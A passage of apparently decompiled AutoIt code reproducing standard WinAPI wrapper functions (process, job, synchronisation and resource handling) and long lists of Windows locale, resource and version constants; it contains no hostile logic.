        Local $iret = 0x0
        If Not @error Then
            $acall = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $binherit, "dword", $ipid)
            $ierror = @error
            $iextended = @extended
            If $acall[0x0] Then $iret = $acall[0x0]
            _Security__SetPrivilege($htoken, $SE_DEBUG_NAME, False)
            If @error Then
                $ierror = @error + 0x14
                $iextended = @extended
            EndIf
        Else
            $ierror = @error + 0x1e
        EndIf
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $htoken)
        Return SetError($ierror, $iextended, $iret)
    EndFunc    ; -> _WinAPI_OpenProcess

    Func _WinAPI_OpenProcessToken($iaccess, $hprocess = 0x0)
        If Not $hprocess Then
            $hprocess = DllCall("kernel32.dll", "handle", "GetCurrentProcess")
            $hprocess = $hprocess[0x0]
        EndIf
        Local $acall = DllCall("advapi32.dll", "bool", "OpenProcessToken", "handle", $hprocess, "dword", $iaccess, "handle*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_OpenProcessToken

    Func _WinAPI_OpenSemaphore($ssemaphore, $iaccess = 0x1f0003, $binherit = False)
        Local $acall = DllCall("kernel32.dll", "handle", "OpenSemaphoreW", "dword", $iaccess, "bool", $binherit, "wstr", $ssemaphore)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OpenSemaphore

    Func _WinAPI_QueryInformationJobObject($hjob, $ijobobjectinfoclass, ByRef $tjobobjectinfo)
        Local $acall = DllCall("kernel32.dll", "bool", "QueryInformationJobObject", "handle", $hjob, "int", $ijobobjectinfoclass, "struct*", $tjobobjectinfo, "dword", DllStructGetSize($tjobobjectinfo), "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x5]
    EndFunc    ; -> _WinAPI_QueryInformationJobObject

    Func _WinAPI_ReleaseMutex($hmutex)
        Local $acall = DllCall("kernel32.dll", "bool", "ReleaseMutex", "handle", $hmutex)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ReleaseMutex

    Func _WinAPI_ReleaseSemaphore($hsemaphore, $iincrease = 0x1)
        Local $acall = DllCall("kernel32.dll", "bool", "ReleaseSemaphore", "handle", $hsemaphore, "long", $iincrease, "long*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_ReleaseSemaphore

    Func _WinAPI_ResetEvent($hevent)
        Local $acall = DllCall("kernel32.dll", "bool", "ResetEvent", "handle", $hevent)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ResetEvent

    Func _WinAPI_SetEvent($hevent)
        Local $acall = DllCall("kernel32.dll", "bool", "SetEvent", "handle", $hevent)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetEvent

    Func _WinAPI_SetInformationJobObject($hjob, $ijobobjectinfoclass, $tjobobjectinfo)
        Local $acall = DllCall("kernel32.dll", "bool", "SetInformationJobObject", "handle", $hjob, "int", $ijobobjectinfoclass, "struct*", $tjobobjectinfo, "dword", DllStructGetSize($tjobobjectinfo))
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetInformationJobObject

    Func _WinAPI_SetPriorityClass($ipriority, $ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x600  : 0x1200), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $ierror = 0x0
        Local $acall = DllCall("kernel32.dll", "bool", "SetPriorityClass", "handle", $hprocess[0x0], "dword", $ipriority)
        If @error Then $ierror = @error
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hprocess[0x0])
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetPriorityClass

    Func _WinAPI_SetProcessAffinityMask($hprocess, $imask)
        Local $acall = DllCall("kernel32.dll", "bool", "SetProcessAffinityMask", "handle", $hprocess, "ulong_ptr", $imask)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetProcessAffinityMask

    Func _WinAPI_SetThreadDesktop($hdesktop)
        Local $acall = DllCall("user32.dll", "bool", "SetThreadDesktop", "handle", $hdesktop)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetThreadDesktop

    Func _WinAPI_SetThreadErrorMode($imode)
        Local $acall = DllCall("kernel32.dll", "bool", "SetThreadErrorMode", "dword", $imode, "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_SetThreadErrorMode

    Func _WinAPI_SetThreadExecutionState($iflags)
        Local $acall = DllCall("kernel32.dll", "dword", "SetThreadExecutionState", "dword", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetThreadExecutionState

    Func _WinAPI_TerminateJobObject($hjob, $iexitcode = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "TerminateJobObject", "handle", $hjob, "uint", $iexitcode)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_TerminateJobObject

    Func _WinAPI_TerminateProcess($hprocess, $iexitcode = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hprocess, "uint", $iexitcode)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_TerminateProcess

    Func _WinAPI_UserHandleGrantAccess($hobject, $hjob, $bgrant)
        Local $acall = DllCall("kernel32.dll", "bool", "UserHandleGrantAccess", "handle", $hobject, "handle", $hjob, "bool", $bgrant)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UserHandleGrantAccess

    Func _WinAPI_WaitForInputIdle($hprocess, $itimeout = + -1)
        Local $acall = DllCall("user32.dll", "dword", "WaitForInputIdle", "handle", $hprocess, "dword", $itimeout)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_WaitForInputIdle

    Func _WinAPI_WaitForMultipleObjects($icount, $pahandles, $bwaitall = False, $itimeout = + -1)
        Local $acall = DllCall("kernel32.dll", "INT", "WaitForMultipleObjects", "dword", $icount, "struct*", $pahandles, "bool", $bwaitall, "dword", $itimeout)
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_WaitForMultipleObjects

    Func _WinAPI_WaitForSingleObject($hhandle, $itimeout = + -1)
        Local $acall = DllCall("kernel32.dll", "INT", "WaitForSingleObject", "handle", $hhandle, "dword", $itimeout)
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_WaitForSingleObject

    Func _WinAPI_WriteConsole($hconsole, $stext)
        Local $acall = DllCall("kernel32.dll", "bool", "WriteConsoleW", "handle", $hconsole, "wstr", $stext, "dword", StringLen($stext), "dword*", 0x0, "ptr", 0x0)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_WriteConsole

#EndRegion Public Functions
Global Const $LINGUISTIC_IGNORECASE = 0x10
Global Const $LINGUISTIC_IGNOREDIACRITIC = 0x20
Global Const $NORM_IGNORECASE = 0x1
Global Const $NORM_IGNOREKANATYPE = 0x10000
Global Const $NORM_IGNORENONSPACE = 0x2
Global Const $NORM_IGNORESYMBOLS = 0x4
Global Const $NORM_IGNOREWIDTH = 0x20000
Global Const $NORM_LINGUISTIC_CASING = 0x8000000
Global Const $SORT_DIGITSASNUMBERS = 0x8
Global Const $SORT_STRINGSORT = 0x1000
Global Const $CSTR_LESS_THAN = 0x1
Global Const $CSTR_EQUAL = 0x2
Global Const $CSTR_GREATER_THAN = 0x3
Global Const $MUI_LANGUAGE_ID = 0x4
Global Const $MUI_LANGUAGE_NAME = 0x8
Global Const $DATE_AUTOLAYOUT = 0x40
Global Const $DATE_LONGDATE = 0x2
Global Const $DATE_LTRREADING = 0x10
Global Const $DATE_SHORTDATE = 0x1
Global Const $DATE_RTLREADING = 0x20
Global Const $DATE_USE_ALT_CALENDAR = 0x4
Global Const $DATE_YEARMONTH = 0x8
Global Const $GEO_NATION = 0x1
Global Const $GEO_LATITUDE = 0x2
Global Const $GEO_LONGITUDE = 0x3
Global Const $GEO_ISO2 = 0x4
Global Const $GEO_ISO3 = 0x5
Global Const $GEO_RFC1766 = 0x6
Global Const $GEO_LCID = 0x7
Global Const $GEO_FRIENDLYNAME = 0x8
Global Const $GEO_OFFICIALNAME = 0x9
Global Const $GEO_TIMEZONES = 0xa
Global Const $GEO_OFFICIALLANGUAGES = 0xb
Global Const $GEO_ISO_UN_NUMBER = 0xc
Global Const $GEO_PARENT = 0xd
Global Const $LOCALE_ILANGUAGE = 0x1
Global Const $LOCALE_SLANGUAGE = 0x2
Global Const $LOCALE_SENGLANGUAGE = 0x1001
Global Const $LOCALE_SABBREVLANGNAME = 0x3
Global Const $LOCALE_SNATIVELANGNAME = 0x4
Global Const $LOCALE_ICOUNTRY = 0x5
Global Const $LOCALE_SCOUNTRY = 0x6
Global Const $LOCALE_SENGCOUNTRY = 0x1002
Global Const $LOCALE_SABBREVCTRYNAME = 0x7
Global Const $LOCALE_SNATIVECTRYNAME = 0x8
Global Const $LOCALE_IDEFAULTLANGUAGE = 0x9
Global Const $LOCALE_IDEFAULTCOUNTRY = 0xa
Global Const $LOCALE_IDEFAULTCODEPAGE = 0xb
Global Const $LOCALE_IDEFAULTANSICODEPAGE = 0x1004
Global Const $LOCALE_IDEFAULTMACCODEPAGE = 0x1011
Global Const $LOCALE_SLIST = 0xc
Global Const $LOCALE_IMEASURE = 0xd
Global Const $LOCALE_SDECIMAL = 0xe
Global Const $LOCALE_STHOUSAND = 0xf
Global Const $LOCALE_SGROUPING = 0x10
Global Const $LOCALE_IDIGITS = 0x11
Global Const $LOCALE_ILZERO = 0x12
Global Const $LOCALE_INEGNUMBER = 0x1010
Global Const $LOCALE_SNATIVEDIGITS = 0x13
Global Const $LOCALE_SCURRENCY = 0x14
Global Const $LOCALE_SINTLSYMBOL = 0x15
Global Const $LOCALE_SMONDECIMALSEP = 0x16
Global Const $LOCALE_SMONTHOUSANDSEP = 0x17
Global Const $LOCALE_SMONGROUPING = 0x18
Global Const $LOCALE_ICURRDIGITS = 0x19
Global Const $LOCALE_IINTLCURRDIGITS = 0x1a
Global Const $LOCALE_ICURRENCY = 0x1b
Global Const $LOCALE_INEGCURR = 0x1c
Global Const $LOCALE_SDATE = 0x1d
Global Const $LOCALE_STIME = 0x1e
Global Const $LOCALE_SSHORTDATE = 0x1f
Global Const $LOCALE_SLONGDATE = 0x20
Global Const $LOCALE_STIMEFORMAT = 0x1003
Global Const $LOCALE_IDATE = 0x21
Global Const $LOCALE_ILDATE = 0x22
Global Const $LOCALE_ITIME = 0x23
Global Const $LOCALE_ITIMEMARKPOSN = 0x1005
Global Const $LOCALE_ICENTURY = 0x24
Global Const $LOCALE_ITLZERO = 0x25
Global Const $LOCALE_IDAYLZERO = 0x26
Global Const $LOCALE_IMONLZERO = 0x27
Global Const $LOCALE_S1159 = 0x28
Global Const $LOCALE_S2359 = 0x29
Global Const $LOCALE_ICALENDARTYPE = 0x1009
Global Const $LOCALE_IOPTIONALCALENDAR = 0x100b
Global Const $LOCALE_IFIRSTDAYOFWEEK = 0x100c
Global Const $LOCALE_IFIRSTWEEKOFYEAR = 0x100d
Global Const $LOCALE_SDAYNAME1 = 0x2a
Global Const $LOCALE_SDAYNAME2 = 0x2b
Global Const $LOCALE_SDAYNAME3 = 0x2c
Global Const $LOCALE_SDAYNAME4 = 0x2d
Global Const $LOCALE_SDAYNAME5 = 0x2e
Global Const $LOCALE_SDAYNAME6 = 0x2f
Global Const $LOCALE_SDAYNAME7 = 0x30
Global Const $LOCALE_SABBREVDAYNAME1 = 0x31
Global Const $LOCALE_SABBREVDAYNAME2 = 0x32
Global Const $LOCALE_SABBREVDAYNAME3 = 0x33
Global Const $LOCALE_SABBREVDAYNAME4 = 0x34
Global Const $LOCALE_SABBREVDAYNAME5 = 0x35
Global Const $LOCALE_SABBREVDAYNAME6 = 0x36
Global Const $LOCALE_SABBREVDAYNAME7 = 0x37
Global Const $LOCALE_SMONTHNAME1 = 0x38
Global Const $LOCALE_SMONTHNAME2 = 0x39
Global Const $LOCALE_SMONTHNAME3 = 0x3a
Global Const $LOCALE_SMONTHNAME4 = 0x3b
Global Const $LOCALE_SMONTHNAME5 = 0x3c
Global Const $LOCALE_SMONTHNAME6 = 0x3d
Global Const $LOCALE_SMONTHNAME7 = 0x3e
Global Const $LOCALE_SMONTHNAME8 = 0x3f
Global Const $LOCALE_SMONTHNAME9 = 0x40
Global Const $LOCALE_SMONTHNAME10 = 0x41
Global Const $LOCALE_SMONTHNAME11 = 0x42
Global Const $LOCALE_SMONTHNAME12 = 0x43
Global Const $LOCALE_SMONTHNAME13 = 0x100e
Global Const $LOCALE_SABBREVMONTHNAME1 = 0x44
Global Const $LOCALE_SABBREVMONTHNAME2 = 0x45
Global Const $LOCALE_SABBREVMONTHNAME3 = 0x46
Global Const $LOCALE_SABBREVMONTHNAME4 = 0x47
Global Const $LOCALE_SABBREVMONTHNAME5 = 0x48
Global Const $LOCALE_SABBREVMONTHNAME6 = 0x49
Global Const $LOCALE_SABBREVMONTHNAME7 = 0x4a
Global Const $LOCALE_SABBREVMONTHNAME8 = 0x4b
Global Const $LOCALE_SABBREVMONTHNAME9 = 0x4c
Global Const $LOCALE_SABBREVMONTHNAME10 = 0x4d
Global Const $LOCALE_SABBREVMONTHNAME11 = 0x4e
Global Const $LOCALE_SABBREVMONTHNAME12 = 0x4f
Global Const $LOCALE_SABBREVMONTHNAME13 = 0x100f
Global Const $LOCALE_SPOSITIVESIGN = 0x50
Global Const $LOCALE_SNEGATIVESIGN = 0x51
Global Const $LOCALE_IPOSSIGNPOSN = 0x52
Global Const $LOCALE_INEGSIGNPOSN = 0x53
Global Const $LOCALE_IPOSSYMPRECEDES = 0x54
Global Const $LOCALE_IPOSSEPBYSPACE = 0x55
Global Const $LOCALE_INEGSYMPRECEDES = 0x56
Global Const $LOCALE_INEGSEPBYSPACE = 0x57
Global Const $LOCALE_FONTSIGNATURE = 0x58
Global Const $LOCALE_SISO639LANGNAME = 0x59
Global Const $LOCALE_SISO3166CTRYNAME = 0x5a
Global Const $LOCALE_IDEFAULTEBCDICCODEPAGE = 0x1012
Global Const $LOCALE_IPAPERSIZE = 0x100a
Global Const $LOCALE_SENGCURRNAME = 0x1007
Global Const $LOCALE_SNATIVECURRNAME = 0x1008
Global Const $LOCALE_SYEARMONTH = 0x1006
Global Const $LOCALE_SSORTNAME = 0x1013
Global Const $LOCALE_IDIGITSUBSTITUTION = 0x1014
Global Const $LOCALE_CUSTOM_DEFAULT = 0xc00
Global Const $LOCALE_CUSTOM_UI_DEFAULT = 0x1400
Global Const $LOCALE_CUSTOM_UNSPECIFIED = 0x1000
Global Const $LOCALE_INVARIANT = 0x7f
Global Const $LOCALE_SYSTEM_DEFAULT = 0x800
Global Const $LOCALE_USER_DEFAULT = 0x400
Global Const $TIME_FORCE24HOURFORMAT = 0x8
Global Const $TIME_NOMINUTESORSECONDS = 0x1
Global Const $TIME_NOSECONDS = 0x2
Global Const $TIME_NOTIMEMARKER = 0x4
Global Const $LCID_INSTALLED = 0x1
Global Const $LCID_SUPPORTED = 0x2
Global Const $RT_ACCELERATOR = 0x9
Global Const $RT_ANICURSOR = 0x15
Global Const $RT_ANIICON = 0x16
Global Const $RT_BITMAP = 0x2
Global Const $RT_CURSOR = 0x1
Global Const $RT_DIALOG = 0x5
Global Const $RT_DLGINCLUDE = 0x11
Global Const $RT_FONT = 0x8
Global Const $RT_FONTDIR = 0x7
Global Const $RT_GROUP_CURSOR = 0xc
Global Const $RT_GROUP_ICON = 0xe
Global Const $RT_HTML = 0x17
Global Const $RT_ICON = 0x3
Global Const $RT_MANIFEST = 0x18
Global Const $RT_MENU = 0x4
Global Const $RT_MESSAGETABLE = 0xb
Global Const $RT_PLUGPLAY = 0x13
Global Const $RT_RCDATA = 0xa
Global Const $RT_STRING = 0x6
Global Const $RT_VERSION = 0x10
Global Const $RT_VXD = 0x14
Global Const $FILE_VER_GET_LOCALISED = 0x1
Global Const $FILE_VER_GET_NEUTRAL = 0x2
Global Const $FILE_VER_GET_PREFETCHED = 0x4
Global Const $OBM_TRTYPE = 0x7fdc
Global Const $OBM_LFARROWI = 0x7fde
Global Const $OBM_RGARROWI = 0x7fdf
Global Const $OBM_DNARROWI = 0x7fe0
Global Const $OBM_UPARROWI = 0x7fe1
Global Const $OBM_COMBO = 0x7fe2
Global Const $OBM_MNARROW = 0x7fe3
Global Const $OBM_LFARROWD = 0x7fe4
Global Const $OBM_RGARROWD = 0x7fe5
Global Const $OBM_DNARROWD = 0x7fe6
Global Const $OBM_UPARROWD = 0x7fe7
Global Const $OBM_RESTORED = 0x7fe8
Global Const $OBM_ZOOMD = 0x7fe9
Global Const $OBM_REDUCED = 0x7fea
Global Const $OBM_RESTORE = 0x7feb
Global Const $OBM_ZOOM = 0x7fec
Global Const $OBM_REDUCE = 0x7fed
Global Const $OBM_LFARROW = 0x7fee
Global Const $OBM_RGARROW = 0x7fef
Global Const $OBM_DNARROW = 0x7ff0
Global Const $OBM_UPARROW = 0x7ff1
Global Const $OBM_CLOSE = 0x7ff2
Global Const $OBM_OLD_RESTORE = 0x7ff3
Global Const $OBM_OLD_ZOOM = 0x7ff4
Global Const $OBM_OLD_REDUCE = 0x7ff5
Global Const $OBM_BTNCORNERS = 0x7ff6
Global Const $OBM_CHECKBOXES = 0x7ff7
Global Const $OBM_CHECK = 0x7ff8
Global Const $OBM_BTSIZE = 0x7ff9
Global Const $OBM_OLD_LFARROW = 0x7ffa
Global Const $OBM_OLD_RGARROW = 0x7ffb
Global Const $OBM_OLD_DNARROW = 0x7ffc
Global Const $OBM_OLD_UPARROW = 0x7ffd
Global Const $OBM_SIZE = 0x7ffe
Global Const $OBM_OLD_CLOSE = 0x7fff
Global Const $OIC_SAMPLE = 0x7f00
Global Const $OIC_HAND = 0x7f01
Global Const $OIC_QUES = 0x7f02
Global Const $OIC_BANG = 0x7f03
Global Const $OIC_NOTE = 0x7f04
Global Const $OIC_WINLOGO = 0x7f05
Global Const $OIC_WARNING = $OIC_BANG
Global Const $OIC_ERROR = $OIC_HAND
Global Const $OIC_INFORMATION = $OIC_NOTE
Global Const $DONT_RESOLVE_DLL_REFERENCES = 0x1
Global Const $LOAD_LIBRARY_AS_DATAFILE = 0x2
Global Const $LOAD_WITH_ALTERED_SEARCH_PATH = 0x8
Global Const $LOAD_IGNORE_CODE_AUTHZ_LEVEL = 0x10
Global Const $LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE = 0x40
Global Const $LOAD_LIBRARY_AS_IMAGE_RESOURCE = 0x20
Global Const $LOAD_LIBRARY_SEARCH_APPLICATION_DIR = 0x200
Global Const $LOAD_LIBRARY_SEARCH_DEFAULT_DIRS = 0x1000
Global Const $LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR = 0x100
Global Const $LOAD_LIBRARY_SEARCH_SYSTEM32 = 0x800
Global Const $LOAD_LIBRARY_SEARCH_USER_DIRS = 0x400
Global Const $OCR_NORMAL = 0x7f00
Global Const $OCR_IBEAM = 0x7f01
Global Const $OCR_WAIT = 0x7f02
Global Const $OCR_CROSS = 0x7f03
Global Const $OCR_UP = 0x7f04
Global Const $OCR_SIZE = 0x7f80
Global Const $OCR_ICON = 0x7f81
Global Const $OCR_SIZENWSE = 0x7f82
Global Const $OCR_SIZENESW = 0x7f83
Global Const $OCR_SIZEWE = 0x7f84
Global Const $OCR_SIZENS = 0x7f85
Global Const $OCR_SIZEALL = 0x7f86
Global Const $OCR_ICOCUR = 0x7f87
Global Const $OCR_NO = 0x7f88
Global Const $OCR_HAND = 0x7f89
Global Const $OCR_APPSTARTING = 0x7f8a
Global Const $OCR_HELP = 0x7f8b
Global Const $VS_FF_DEBUG = 0x1
Global Const $VS_FF_INFOINFERRED = 0x10
Global Const $VS_FF_PATCHED = 0x4
Global Const $VS_FF_PRERELEASE = 0x2
Global Const $VS_FF_PRIVATEBUILD = 0x8
Global Const $VS_FF_SPECIALBUILD = 0x20
Global Const $VOS_DOS = 0x10000
Global Const $VOS_NT = 0x40000
Global Const $VOS__WINDOWS16 = 0x1
Global Const $VOS__WINDOWS32 = 0x4
Global Const $VOS_OS216 = 0x20000
Global Const $VOS_OS232 = 0x30000
Global Const $VOS__PM16 = 0x2
Global Const $VOS__PM32 = 0x3
Global Const $VOS_UNKNOWN = 0x0
Global Const $VOS_DOS_WINDOWS16 = 0x10001
Global Const $VOS_DOS_WINDOWS32 = 0x10004
Global Const $VOS_NT_WINDOWS32 = 0x40004
Global Const $VOS_OS216_PM16 = 0x20002
Global Const $VOS_OS232_PM32 = 0x30003
Global Const $VFT_APP = 0x1
Global Const $VFT_DLL = 0x2
Global Const $VFT_DRV = 0x3
Global Const $VFT_FONT = 0x4
Global Const $VFT_STATIC_LIB = 0x7
Global Const $VFT_UNKNOWN = 0x0
Global Const $VFT_VXD = 0x5
Global Const $VFT2_DRV_COMM = 0xa
Global Const $VFT2_DRV_DISPLAY = 0x4
Global Const $VFT2_DRV_INSTALLABLE = 0x8
Global Const $VFT2_DRV_KEYBOARD = 0x2
Global Const $VFT2_DRV_LANGUAGE = 0x3
Global Const $VFT2_DRV_MOUSE = 0x5
Global Const $VFT2_DRV_NETWORK = 0x6
Global Const $VFT2_DRV_PRINTER = 0x1
Global Const $VFT2_DRV_SOUND = 0x9
Global Const $VFT2_DRV_SYSTEM = 0x7
Global Const $VFT2_DRV_VERSIONED_PRINTER = 0xc
Global Const $VFT2_UNKNOWN = 0x0
Global Const $VFT2_FONT_RASTER = 0x1
Global Const $VFT2_FONT_TRUETYPE = 0x3
Global Const $VFT2_FONT_VECTOR = 0x2
#Region Global Variables and Constants
    Global $__g_vval
    Global Const $TAGVS_FIXEDFILEINFO = "dword Signature;dword StrucVersion;dword FileVersionMS;dword FileVersionLS;dword ProductVersionMS;dword ProductVersionLS;dword FileFlagsMask;dword FileFlags;dwo" & _
        "rd FileOS;dword FileType;dword FileSubtype;dword FileDateMS;dword FileDateLS"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_BeginUpdateResource($sfilepath, $bdelete = False)
        Local $acall = DllCall("kernel32.dll", "handle", "BeginUpdateResourceW", "wstr", $sfilepath, "bool", $bdelete)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_BeginUpdateResource

    Func _WinAPI_ClipCursor($trect)
        Local $acall = DllCall("user32.dll", "bool", "ClipCursor", "struct*", $trect)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ClipCursor

    Func _WinAPI_CopyCursor($hcursor)
        Return _WinAPI_CopyIcon($hcursor)
    EndFunc    ; -> _WinAPI_CopyCursor

    Func _WinAPI_CreateCaret($hwnd, $hbitmap, $iwidth = 0x0, $iheight = 0x0)
        Local $acall = DllCall("user32.dll", "bool", "CreateCaret", "hwnd", $hwnd, "handle", $hbitmap, "int", $iwidth, "int", $iheight)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateCaret

    Func _WinAPI_DestroyCaret()
        Local $acall = DllCall("user32.dll", "bool", "DestroyCaret")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DestroyCaret

    Func _WinAPI_DestroyCursor($hcursor)
        Local $acall = DllCall("user32.dll", "bool", "DestroyCursor", "handle", $hcursor)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DestroyCursor

    Func _WinAPI_EndUpdateResource($hupdate, $bdiscard = False)
        Local $acall = DllCall("kernel32.dll", "bool", "EndUpdateResourceW", "handle", $hupdate, "bool", $bdiscard)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_EndUpdateResource

    Func _WinAPI_EnumResourceLanguages($hmodule, $stype, $sname)
        Local $ilibrary = 0x0, $stypeoftype = "int", $stypeofname = "int"
        If IsString($hmodule) Then
            If StringStripWS($hmodule, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then
                $hmodule = _WinAPI_LoadLibraryEx($hmodule, BitOR($DONT_RESOLVE_DLL_REFERENCES, $LOAD_LIBRARY_AS_DATAFILE))
                If Not $hmodule Then Return SetError(0x1, 0x0, 0x0)
                $ilibrary = 0x1
            Else
                $hmodule = 0x0
            EndIf
        EndIf
        If IsString($stype) Then
            $stypeoftype = "wstr"
        EndIf
        If IsString($sname) Then
            $stypeofname = "wstr"
        EndIf
        Dim $__g_venum[0x65] = [0x0]
        Local $henumproc = DllCallbackRegister("__EnumResLanguagesProc", "bool", "handle;ptr;ptr;word;long_ptr")
        Local $acall = DllCall("kernel32.dll", "bool", "EnumResourceLanguagesW", "handle", $hmodule, $stypeoftype, $stype, $stypeofname, $sname, "ptr", DllCallbackGetPtr($henumproc), "long_ptr", 0x0)
        If @error Or Not $acall[0x0] Or Not $__g_venum[0x0] Then
            $__g_venum = @error + 0xa
        EndIf
        If $ilibrary Then
            _WinAPI_FreeLibrary($hmodule)
        EndIf
        DllCallbackFree($henumproc)
        If $__g_venum Then Return SetError($__g_venum, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_EnumResourceLanguages

    Func _WinAPI_EnumResourceNames($hmodule, $stype)
        Local $acall, $henumproc, $ilibrary = 0x0, $stypeoftype = "int"
        If IsString($hmodule) Then
            If StringStripWS($hmodule, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then
                $hmodule = _WinAPI_LoadLibraryEx($hmodule, BitOR($DONT_RESOLVE_DLL_REFERENCES, $LOAD_LIBRARY_AS_DATAFILE))
                If Not $hmodule Then Return SetError(0x1, 0x0, 0x0)
                $ilibrary = 0x1
            Else
                $hmodule = 0x0
            EndIf
        EndIf
        If IsString($stype) Then
            $stypeoftype = "wstr"
        EndIf
        Dim $__g_venum[0x65] = [0x0]
        $henumproc = DllCallbackRegister("__EnumResNamesProc", "bool", "handle;ptr;ptr;long_ptr")
        $acall = DllCall("kernel32.dll", "bool", "EnumResourceNamesW", "handle", $hmodule, $stypeoftype, $stype, "ptr", DllCallbackGetPtr($henumproc), "long_ptr", 0x0)
        If @error Or Not $acall[0x0] Or (Not $__g_venum[0x0]) Then
            $__g_venum = @error + 0xa
        EndIf
        If $ilibrary Then
            _WinAPI_FreeLibrary($hmodule)
        EndIf
        DllCallbackFree($henumproc)
        If $__g_venum Then Return SetError($__g_venum, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_EnumResourceNames

    Func _WinAPI_EnumResourceTypes($hmodule)
        Local $ilibrary = 0x0
        If IsString($hmodule) Then
            If StringStripWS($hmodule, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then
                $hmodule = _WinAPI_LoadLibraryEx($hmodule, BitOR($DONT_RESOLVE_DLL_REFERENCES, $LOAD_LIBRARY_AS_DATAFILE))
                If Not $hmodule Then Return SetError(0x1, 0x0, 0x0)
                $ilibrary = 0x1
            Else
                $hmodule = 0x0
            EndIf
        EndIf
        Dim $__g_venum[0x65] = [0x0]
        Local $henumproc = DllCallbackRegister("__EnumResTypesProc", "bool", "handle;ptr;long_ptr")
        Local $acall = DllCall("kernel32.dll", "bool", "EnumResourceTypesW", "handle", $hmodule, "ptr", DllCallbackGetPtr($henumproc), "long_ptr", 0x0)
        If @error Or Not $acall[0x0] Or (Not $__g_venum[0x0]) Then
            $__g_venum = @error + 0xa
        EndIf
        If $ilibrary Then
            _WinAPI_FreeLibrary($hmodule)
        EndIf
        DllCallbackFree($henumproc)
        If $__g_venum Then Return SetError($__g_venum, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_EnumResourceTypes

    Func _WinAPI_FindResource($hinstance, $stype, $sname)
        Local $stypeoftype = "int", $stypeofname = "int"
        If IsString($stype) Then
            $stypeoftype = "wstr"
        EndIf
        If IsString($sname) Then
            $stypeofname = "wstr"
        EndIf
        Local $acall = DllCall("kernel32.dll", "handle", "FindResourceW", "handle", $hinstance, $stypeofname, $sname, $stypeoftype, $stype)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindResource

    Func _WinAPI_FindResourceEx($hinstance, $stype, $sname, $ilanguage)
        Local $stypeoftype = "int", $stypeofname = "int"
        If IsString($stype) Then
            $stypeoftype = "wstr"
        EndIf
        If IsString($sname) Then
            $stypeofname = "wstr"
        EndIf
